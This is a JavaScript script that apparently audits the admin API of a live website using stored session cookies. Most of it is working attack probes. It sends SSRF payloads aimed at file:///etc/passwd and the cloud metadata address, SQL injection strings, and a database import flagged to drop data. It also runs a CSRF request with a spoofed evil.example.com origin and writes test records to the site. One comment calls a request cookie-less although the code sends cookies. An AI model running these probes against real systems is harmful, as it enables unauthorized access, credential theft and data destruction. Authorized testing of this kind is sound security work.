// Fast raw-API probe — no browser, ablated
const fs = require('fs');
const AUTH = '/Users/nick/Desktop/awesome-list-site/hunt-workspace/hunt-auth.json';
const cookies = JSON.parse(fs.readFileSync(AUTH, 'utf8'));
const cookieHeader = cookies.cookies.map(c => `${c.name}=${c.value}`).join('; ');

const findings = [];
async function probe(url, method, body, opts = {}) {
  const start = Date.now();
  try {
    const r = await fetch(url, {
      method,
      headers: {
        Cookie: cookieHeader,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 admin-fast',
        ...(opts.origin ? { Origin: opts.origin } : {}),
        ...(opts.csrfToken ? { 'X-CSRF-Token': opts.csrfToken } : {}),
      },
      body: body ? JSON.stringify(body) : undefined,
      redirect: 'manual',
    });
    const text = await r.text();
    const t = Date.now() - start;
    return { url, method, status: r.status, ms: t, body: text.slice(0, 600) };
  } catch (e) {
    return { url, method, error: e.message };
  }
}

(async () => {
  // 1) probe unauth GET vs auth GET — find endpoints that don't 401 unauth
  const unauthTargets = [
    '/api/admin/users',
    '/api/admin/resources',
    '/api/admin/categories',
    '/api/admin/journeys',
    '/api/admin/submissions',
    '/api/admin/config',
    '/api/admin/settings',
    '/api/admin/audit',
    '/api/admin/health',
    '/api/admin/db/export',
    '/api/admin/db/import',
    '/api/admin/db/backup',
    '/api/admin/flags',
    '/api/admin/logs',
    '/api/admin/profile',
    '/api/users',
    '/api/categories',
    '/api/submissions',
    '/api/audit',
    '/api/flags',
    '/api/admin/categories/new',
    '/api/admin/users/new',
  ];
  for (const u of unauthTargets) {
    const r = await probe('https://awesome.video' + u, 'GET', null);
    findings.push({ phase: 'unauth', ...r });
  }

  // 2) probe auth GET
  for (const u of unauthTargets.map(u => u.replace(/^\/api/, '/api'))) {
    const r = await probe('https://awesome.video' + u, 'GET', null);
    findings.push({ phase: 'auth-get', ...r });
  }

  // 3) auth POST create category
  const r1 = await probe('https://awesome.video/api/admin/categories', 'POST', { name: 'TestCat-Audit-' + Date.now(), description: 'audit probe' });
  findings.push({ phase: 'auth-post-cat', ...r1 });

  // 4) auth POST create resource
  const r2 = await probe('https://awesome.video/api/admin/resources', 'POST', {
    title: 'TestResource-Audit-' + Date.now(),
    url: 'https://example.com/audit-' + Date.now(),
    category: 'community-events',
    description: 'audit probe',
  });
  findings.push({ phase: 'auth-post-res', ...r2 });

  // 5) CSRF probe — POST with cookie-less request
  const csrf1 = await probe('https://awesome.video/api/admin/categories', 'POST', { name: 'csrf-Audit-' + Date.now() }, { origin: 'https://evil.example.com' });
  findings.push({ phase: 'csrf-post', cookie: 'no', ...csrf1 });

  // 6) SSRF: probe file-fetch endpoints
  const r3 = await probe('https://awesome.video/api/admin/import-url', 'POST', { url: 'file:///etc/passwd' });
  const r4 = await probe('https://awesome.video/api/admin/fetch', 'POST', { url: 'http://169.254.169.254/latest/meta-data/' });
  const r5 = await probe('https://awesome.video/api/admin/db/import', 'POST', { data: { drop: true } });
  findings.push({ phase: 'ssrf1', ...r3 });
  findings.push({ phase: 'ssrf2', ...r4 });
  findings.push({ phase: 'import-evil', ...r5 });

  // 7) SQLi on filter endpoints
  for (const ep of ['/api/admin/resources', '/api/admin/categories', '/api/admin/users', '/api/admin/audit']) {
    const r = await probe('https://awesome.video' + ep + "?q=' OR 1=1--", 'GET', null);
    const r2 = await probe('https://awesome.video' + ep + '?limit=99999&offset=-1', 'GET', null);
    findings.push({ phase: 'sqli-filter', ...r });
    findings.push({ phase: 'pagination', ...r2 });
  }

  // 8) Check response headers for security
  const h = await fetch('https://awesome.video/admin', { headers: { Cookie: cookieHeader } });
  const headers = {};
  h.headers.forEach((v, k) => headers[k] = v);
  findings.push({ phase: 'headers', url: '/admin', status: h.status, headers });

  fs.writeFileSync('/Users/nick/Desktop/awesome-list-site/hunt-workspace/admin-fast-api.json', JSON.stringify(findings, null, 2));
  console.log(JSON.stringify(findings.slice(0, 30), null, 2));
})();
